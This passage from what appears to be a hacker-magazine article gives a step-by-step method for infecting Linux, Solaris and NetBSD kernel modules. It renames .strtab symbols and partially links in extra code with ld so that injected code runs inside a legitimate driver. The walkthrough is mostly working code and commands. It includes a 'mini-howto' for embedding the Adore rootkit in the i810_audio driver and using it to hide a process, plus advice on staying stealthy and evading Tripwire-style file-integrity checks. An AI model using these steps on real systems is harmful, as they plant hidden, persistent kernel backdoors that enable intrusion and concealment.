<p>The preceding tech makes it possible to execute a function instead of another one, however this is not very interesting. It will be much better to inject external code into the module. This can be <strong>easily</strong> done by using the wonderfull linker: ld.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//$ cat original.c</span><br/>
<span style="color: #339933;">#define MODULE</span><br/>
<span style="color: #339933;">#define __KERNEL__</span><br/>
<br/>
<span style="color: #339933;">#include &lt;linux/module.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;linux/kernel.h&gt;</span><br/>
<br/>
<span style="color: #993333;">int</span> init_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span> <br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Into init_module()<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> cleanup_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span> <br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Into cleanup_module()<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
$ cat inject.<span style="color: #202020;">c</span><br/>
<span style="color: #339933;">#define MODULE</span><br/>
<span style="color: #339933;">#define __KERNEL__</span><br/>
<br/>
<span style="color: #339933;">#include &lt;linux/module.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;linux/kernel.h&gt;</span><br/>
<br/>
<br/>
<span style="color: #993333;">int</span> inje_module <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Injected<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<pre>
$ cc -O2 -c original.c
$ cc -O2 -c inject.c
</pre>
<p>Here starts the important part. The injection of the code is not a problem because kernel modules are relocatable ELF object files. This type of objects can be linked together to share symbols and complete each other. However a rule must be complied: the same symbol can't exist in several modules which are linked together. We use ld with the -r option to make a partial link wich creates an object of the same nature as the objects wich are linked. This will create a module which can be loaded by the kernel.</p>
<pre>
$ ld -r original.o inject.o -o evil.o
$ mv evil.o original.o 
$ objdump -t original.o 

original.o:     file format elf32-i386

SYMBOL TABLE:
0000000000000000 l    d  .text  0000000000000000 
0000000000000000 l    d  *ABS*  0000000000000000 
0000000000000000 l    d  .rodata   0000000000000000 
0000000000000000 l    d  .modinfo  0000000000000000 
0000000000000000 l    d  .data  0000000000000000 
0000000000000000 l    d  .bss   0000000000000000 
0000000000000000 l    d  .comment  0000000000000000 
0000000000000000 l    d  *ABS*  0000000000000000 
0000000000000000 l    d  *ABS*  0000000000000000 
0000000000000000 l    d  *ABS*  0000000000000000 
0000000000000000 l    df *ABS*  0000000000000000 original.c
0000000000000000 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000000 l    df *ABS*  0000000000000000 inject.c
0000000000000016 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000014 g     F .text  0000000000000014 cleanup_module
0000000000000000 g     F .text  0000000000000014 init_module
0000000000000000         *UND*  0000000000000000 printk
0000000000000028 g     F .text  0000000000000014 inje_module
</pre>
<p>The inje_module() function has been linked into the module. Now we are going to modify the .strtab section to make inje_module() be called instead of init_module().</p>
<pre>
$ ./elfstrchange original.o init_module dumm_module
[+] Symbol init_module located at 0x4a8
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange original.o inje_module init_module
[+] Symbol inje_module located at 0x4bb
[+] .strtab entry overwriten with init_module
</pre>
<p>Let's fire it up:</p>
<pre>
# insmod original.o
# tail -n 1 /var/log/kernel 
May 14 20:37:02 accelerator kernel:  Injected
</pre>
<p>And the magic occurs :)</p>
<h3><a name="c34"></a>3.4 - Keeping stealth</h3>
<p>Most of the time, we will infect a module which is in use. If we replace the init_module() function with another one, the module loses its original purpose for our profit. However, if the infected module does not work properly it can be easily detected. But there is a solution that permits to inject code into a module without modifying its regular behaviour. After the .strtab hack, the real init_module() function is named dumm_module. If we put a call to dumm_module() into our evil_module() function, the real init_module() function will be called at initialization and the module will keep its regular behaviour.</p>
<pre>  
                 replace 
    init_module  ------>  dumm_module
    inje_module  ------>  init_module (will call dumm_module) 
</pre>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//$ cat stealth.c</span><br/>
<span style="color: #339933;">#define MODULE</span><br/>
<span style="color: #339933;">#define __KERNEL__</span><br/>
<br/>
<span style="color: #339933;">#include &lt;linux/module.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;linux/kernel.h&gt;</span><br/>
<br/>
<br/>
<span style="color: #993333;">int</span> inje_module <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; dumm_module <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; printk <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&lt;1&gt; Injected<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<pre>
$ cc -O2 -c stealth.c
$ ld -r original.o stealth.o -o evil.o
$ mv evil.o original.o 
$ ./elfstrchange original.o init_module dumm_module
[+] Symbol init_module located at 0x4c9
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange original.o inje_module init_module
[+] Symbol inje_module located at 0x4e8
[+] .strtab entry overwriten with init_module

# insmod original.o 
# tail -n 2 /var/log/kernel 
May 17 14:57:31 accelerator kernel:  Into init_module()
May 17 14:57:31 accelerator kernel:  Injected
</pre>
<p>Perfect, the injected code is executed after the regular code so that the modification is stealth.</p>
<h2><a name="c4"></a>4 - Real life example</h2>
<p>The method used to modify init_module() in the preceding parts can be applied without any problem to the cleanup_module() function. Thus, we can plan to inject a complete module into another one. I've injected the well known Adore[2] rootkit into my sound driver (i810_audio.o) with a rather simple handling.</p>
<h3><a name="c41"></a>4.1 - Lkm infecting mini-howto</h3>
<ol>
<li>We have to slightly modify adore.c
<ul>
<li>Insert a call to dumm_module() in the init_module() function's code</li>
<li>Insert a call to dummcle_module() in the cleanup_module() module function's code</li>
<li>Replace the init_module function's name with evil_module</li>
<li>Replace the cleanup_module function's name with evclean_module</li>
</ul></li>
<li>Compile adore using make</li>
<li>Link adore.o with i810_audio.o
<pre>ld -r i810_audio.o adore.o -o evil.o</pre>
<p>If the module is already loaded, you have to remove it: rmmod i810_audio</p>
<pre>mv evil.o i810_audio.o</pre></li>
<li>Modify the .strtab section
<pre>
                 replace
  init_module    ------> dumm_module
  evil_module    ------> init_module (will call dumm_module)

  cleanup_module ------> evclean_module
  evclean_module ------> cleanup_module (will call evclean_module)

$ ./elfstrchange i810_audio.o init_module dumm_module 
[+] Symbol init_module located at 0xa2db
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange i810_audio.o evil_module init_module
[+] Symbol evil_module located at 0xa4d1
[+] .strtab entry overwriten with init_module

$ ./elfstrchange i810_audio.o cleanup_module dummcle_module
[+] Symbol cleanup_module located at 0xa169
[+] .strtab entry overwriten with dummcle_module

$ ./elfstrchange i810_audio.o evclean_module cleanup_module
[+] Symbol evclean_module located at 0xa421
[+] .strtab entry overwriten with cleanup_module
</pre></li>
<li>Load and test the module
<pre>
# insmod i810_audio
# ./ava     
Usage: ./ava {h,u,r,R,i,v,U} [file, PID or dummy (for U)]

       h hide file
       u unhide file
       r execute as root
       R remove PID forever
       U uninstall adore
       i make PID invisible
       v make PID visible

# ps
  PID TTY          TIME CMD
 2004 pts/3    00:00:00 bash
 2083 pts/3    00:00:00 ps
 
# ./ava i 2004
Checking for adore  0.12 or higher ...
Adore 0.53 installed. Good luck.
Made PID 2004 invisible.

<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2d0cdcdd6e2c3c1c1c7cec7d0c3d6cdd0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/home/truff/adore# ps
  PID TTY          TIME CMD
#     
</pre></li>
</ol>
<p>Beautifull :) I've coded a little shell script (paragraph 9.2) which does some part of the work for lazy people.</p>
<h3><a name="c42"></a>4.2 - I will survive (a reboot)</h3>
<p>When the module is loaded, we have two options that have pros and cons:</p>
<ul>
<li>Replace the real module located in /lib/modules/ by our infected one. This will ensure us that our backdoor code will be reloaded after a reboot. But, if we do that we can be detected by a HIDS (Host Intrusion Detection System) like Tripwire [7]. However, a kernel module is not an executable nor a suid file, so it won't be detected unless the HIDS is configured to be paranoid.</li>
<li>Let the real kernel module unchanged in /lib/modules and delete our infected module. Our module will be removed when rebooting, but it won't be detected by a HIDS that looks for changed files.</li>
</ul>
<h2><a name="c5"></a>5 - What about other systems?</h2>
<h3><a name="c51"></a>5.1 - Solaris</h3>
<p>I've used a basic kernel module from [8] to illustrate this example. Solaris kernel modules use 3 principal functions:</p>
<ul>
<li>_init will be called at module initialisation</li>
<li>_fini will be called at module cleanup</li>
<li>_info prints info about the module when issuing a modinfo</li>
</ul>
<pre>
$ uname -srp
SunOS 5.7 sparc

$ cat mod.c
</pre>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#include &lt;sys/ddi.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/sunddi.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/modctl.h&gt;</span><br/>
<br/>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">struct</span> mod_ops mod_miscops<span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #993333;">static</span> <span style="color: #993333;">struct</span> modlmisc modlmisc <span style="color: #339933;">=</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>mod_miscops<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;Real Loadable Kernel Module&quot;</span><span style="color: #339933;">,</span><br/>
<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #993333;">static</span> <span style="color: #993333;">struct</span> modlinkage modlinkage <span style="color: #339933;">=</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; MODREV_1<span style="color: #339933;">,</span> &nbsp;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">void</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>modlmisc<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; NULL<br/>
<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #993333;">int</span> _init<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> mod_install<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>modlinkage<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmn_err<span style="color: black;">&#40;</span>CE_NOTE<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;Could not install module<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmn_err<span style="color: black;">&#40;</span>CE_NOTE<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;mod: successfully installed&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> i<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> _info<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> modinfo <span style="color: #339933;">*</span>modinfop<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span>mod_info<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>modlinkage<span style="color: #339933;">,</span> modinfop<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> _fini<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> mod_remove<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>modlinkage<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmn_err<span style="color: black;">&#40;</span>CE_NOTE<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;Could not remove module<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmn_err<span style="color: black;">&#40;</span>CE_NOTE<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;mod: successfully removed&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> i<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<pre>
$ gcc -m64 -D_KERNEL -DSRV4 -DSOL2 -c mod.c
$ ld -r -o mod mod.o
$ file mod
mod:            ELF 64-bit MSB relocatable SPARCV9 Version 1
</pre>
<p>As we have seen in the Linux case, the code we are going to inject must contains a call to the real init function to make the module keeps its regular behaviour. However, we are going to face a problem: if we modify the .strtab section after the link operation, the dynamic loader doesn't find the _dumm() function and the module can't be loaded. I've not invistigated a lot into this problem but i think that the dynamic loader on Solaris doesn't looks for undefined symbols into the module itself. However, this problem can be easily solved. If we change the real _init .strtab entry to _dumm before the link operation, everything works well.</p>
<pre>
$ readelf -S mod
There are 10 section headers, starting at offset 0x940:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000000000  00000040
       0000000000000188  0000000000000000  AX       0     0     4
  [ 2] .rodata           PROGBITS         0000000000000000  000001c8
       000000000000009b  0000000000000000   A       0     0     8
  [ 3] .data             PROGBITS         0000000000000000  00000268
       0000000000000050  0000000000000000  WA       0     0     8
  [ 4] .symtab           SYMTAB           0000000000000000  000002b8
       0000000000000210  0000000000000018           5     e     8
  [ 5] .strtab           STRTAB           0000000000000000  000004c8
       0000000000000065  0000000000000000           0     0     1
  [ 6] .comment          PROGBITS         0000000000000000  0000052d
       0000000000000035  0000000000000000           0     0     1
  [ 7] .shstrtab         STRTAB           0000000000000000  00000562
       000000000000004e  0000000000000000           0     0     1
  [ 8] .rela.text        RELA             0000000000000000  000005b0
       0000000000000348  0000000000000018           4     1     8
  [ 9] .rela.data        RELA             0000000000000000  000008f8
       0000000000000048  0000000000000018           4     3     8
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</pre>
<p>The .strtab section starts at offset 0x4c8 and has a size of 64 bytes. We are going to use vi and xxd as an hex editor. Load the module into vi with: vi mod. After that use :%!xxd to convert the module into hex values. You will see something like this:</p>
<pre>
00004c0: 0000 0000 0000 0000 006d 6f64 006d 6f64  .........mod.mod
00004d0: 2e63 006d 6f64 6c69 6e6b 6167 6500 6d6f  .c.modlinkage.mo
00004e0: 646c 6d69 7363 006d 6f64 5f6d 6973 636f  dlmisc.mod_misco
00004f0: 7073 005f 696e 666f 006d 6f64 5f69 6e73  ps._info.mod_ins
0000500: 7461 6c6c 005f 696e 6974 006d 6f64 5f69  tall._init.mod_i
                        ^^^^^^^^^
</pre>
<p>We modify 4 bytes to replace _init by _dumm.</p>
<pre>
00004c0: 0000 0000 0000 0000 006d 6f64 006d 6f64  .........mod.mod
00004d0: 2e63 006d 6f64 6c69 6e6b 6167 6500 6d6f  .c.modlinkage.mo
00004e0: 646c 6d69 7363 006d 6f64 5f6d 6973 636f  dlmisc.mod_misco
00004f0: 7073 005f 696e 666f 006d 6f64 5f69 6e73  ps._info.mod_ins
0000500: 7461 6c6c 005f 6475 6d6d 006d 6f64 5f69  tall._init.mod_i
                        ^^^^^^^^^
</pre>
<p>We use :%!xxd -r to recover the module from hex values, then we save and exit :wq . After that we can verify that the replacement is successfull.</p>
<pre>
$ objdump -t mod

mod:     file format elf64-sparc

SYMBOL TABLE:
0000000000000000 l    df *ABS*  0000000000000000 mod
0000000000000000 l    d  .text  0000000000000000
0000000000000000 l    d  .rodata        0000000000000000
0000000000000000 l    d  .data  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  .comment       0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    df *ABS*  0000000000000000 mod.c
0000000000000010 l     O .data  0000000000000040 modlinkage
0000000000000000 l     O .data  0000000000000010 modlmisc
0000000000000000         *UND*  0000000000000000 mod_miscops
00000000000000a4 g     F .text  0000000000000040 _info
0000000000000000         *UND*  0000000000000000 mod_install
0000000000000000 g     F .text  0000000000000188 _dumm
0000000000000000         *UND*  0000000000000000 mod_info
0000000000000000         *UND*  0000000000000000 mod_remove
00000000000000e4 g     F .text  0000000000000188 _fini
0000000000000000         *UND*  0000000000000000 cmn_err
</pre>
<p>The _init symbol has been replaced by _dumm. Now we can directly inject a function which name is _init without any problem.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//$ cat evil.c</span><br/>
<span style="color: #993333;">int</span> _init<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; _dumm <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; cmn_err<span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;evil: successfully installed&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<pre>          
$ gcc -m64 -D_KERNEL -DSRV4 -DSOL2 -c inject.c
$ ld -r -o inject inject.o

  The injecting part using ld:
  
$ ld -r -o evil mod inject

  Load the module:
  
# modload evil
# tail -f /var/adm/messages
Jul 15 10:58:33 luna unix: NOTICE: mod: successfully installed
Jul 15 10:58:33 luna unix: NOTICE: evil: successfully installed
</pre>
<p>The same operation can be carried out for the _fini function to inject a complete module into another one.</p>
<h3><a name="c52"></a>5.2 - *BSD</h3>
<h4><a name="c521"></a>5.2.1 - FreeBSD</h4>
<pre>
% uname -srm
FreeBSD 4.8-STABLE i386

% file /modules/daemon_saver.ko 
daemon_saver.ko: ELF 32-bit LSB shared object, Intel 80386, version 1 
(FreeBSD), not stripped
</pre>
<p>As we can see, FreeBSD kernel modules are shared objects.Thus, we can't use ld to link aditionnal code into the module. Furthermore, the mechanism which is in use to load a module is completely different from the one used on Linux or Solaris systems. You can have a look to it in /usr/src/sys/kern/kern_linker.c . Any name can be used for the init/cleanup function. At initialisation the loader finds the address of the init function into a structure stored in the .data section. Then the .strtab hack can't be used too.</p>
<h4><a name="c522"></a>5.2.2 - NetBSD</h4>
<pre>
$ file nvidia.o
nvidia.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 
(SYSV), not stripped
</pre>
<p>We can inject code into a NetBSD kernel module because it's a relocatable ELF object. When modload loads a kernel module it links it with the kernel and execute the code placed at the entry point of the module (located in the ELF header).</p>
<p>After the link operation we can change this entry point, but it is not necessary because modload has a special option (-e) that allows to tell it which symbol to use for the entry point.</p>
<p>Here's the example module we are going to infect:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//$ cat gentil_lkm.c</span><br/>
<span style="color: #339933;">#include &lt;sys/cdefs.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/param.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/ioctl.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/systm.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/conf.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/lkm.h&gt;</span><br/>
<br/>
MOD_MISC<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;gentil&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #993333;">int</span> &nbsp; &nbsp; gentil_lkmentry<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*,</span> <span style="color: #993333;">int</span><span style="color: #339933;">,</span> <span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #993333;">int</span> &nbsp; &nbsp; gentil_lkmload<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*,</span> <span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #993333;">int</span> &nbsp; &nbsp; gentil_lkmunload<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*,</span> <span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #993333;">int</span> &nbsp; &nbsp; gentil_lkmstat<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*,</span> <span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #993333;">int</span> gentil_lkmentry<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*</span>lkmt<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> cmd<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> ver<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DISPATCH<span style="color: black;">&#40;</span>lkmt<span style="color: #339933;">,</span> cmd<span style="color: #339933;">,</span> ver<span style="color: #339933;">,</span> gentil_lkmload<span style="color: #339933;">,</span> gentil_lkmunload<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; gentil_lkmstat<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> gentil_lkmload<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*</span>lkmt<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> cmd<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;gentil: Hello, world!<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> gentil_lkmunload<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*</span>lkmt<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> cmd<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;gentil: Goodbye, world!<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #993333;">int</span> gentil_lkmstat<span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> lkm_table <span style="color: #339933;">*</span>lkmt<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> cmd<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;gentil: How you doin', world?<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Here's the code that will be injected:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//$ cat evil_lkm.c</span><br/>
<span style="color: #339933;">#include &lt;sys/cdefs.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/param.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/ioctl.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/systm.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/conf.h&gt;</span><br/>
<span style="color: #339933;">#include &lt;sys/lkm.h&gt;</span><br/>
<br/>
